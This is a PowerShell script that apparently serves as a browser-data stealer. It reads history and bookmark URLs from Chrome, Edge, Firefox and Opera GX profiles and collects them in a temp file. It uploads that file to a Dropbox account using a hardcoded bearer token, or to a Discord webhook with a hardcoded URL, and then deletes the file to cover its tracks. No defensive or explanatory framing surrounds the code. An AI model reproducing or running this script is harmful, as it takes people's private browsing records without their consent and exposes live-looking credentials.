function Get-BrowserData {

    [CmdletBinding()]
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,
        [Parameter(Position=2, Mandatory=$True)]
        [string]$DataType
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE\AppData\Local\Microsof/Edge/User Data/Default/Bookmarks"
    }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    }
    elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }
    elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    }

    $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % { $_.Matches.Value } | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Regex) {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    }
}

Get-BrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"
Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"
Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"
Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"
Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"
Get-BrowserData -Browser "opera" -DataType "history" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"
Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -Append -FilePath "$env:TEMP\--BrowserData.txt"

function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [Alias("f")]
        [string]$SourceFilePath
    )

    $outputFile = Split-Path $SourceFilePath -Leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer sl.BxMsr9C3iozsxFCkkL2qF5Kc5G69ZL98kPVHM0h-4nKRTlrJ4u1nUe-A_b_iUQSigh53a95wH967M09sVEeEY6Cgi1NidHPyJHMOhNyPrhv0kIZQDbT7LGRBTcNpdFR2r8bBYBreYhdL"
    $headers = @{
        "Authorization" = $authorization
        "Dropbox-API-Arg" = $arg
        "Content-Type" = 'application/octet-stream'
    }
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))) {
    DropBox-Upload -SourceFilePath "$env:TEMP\--BrowserData.txt"
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [Parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "https://discord.com/api/webhooks/1216758248838008872/hWqo5YDMw7i6wx7FmUTEtfXUGzvo1h5DpX7_jsllGa9EHAgIYbjKWVhiitJ5gpbuAmir"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file "$env:TEMP\--BrowserData.txt"
}

Remove-Item "$env:TEMP\--BrowserData.txt"
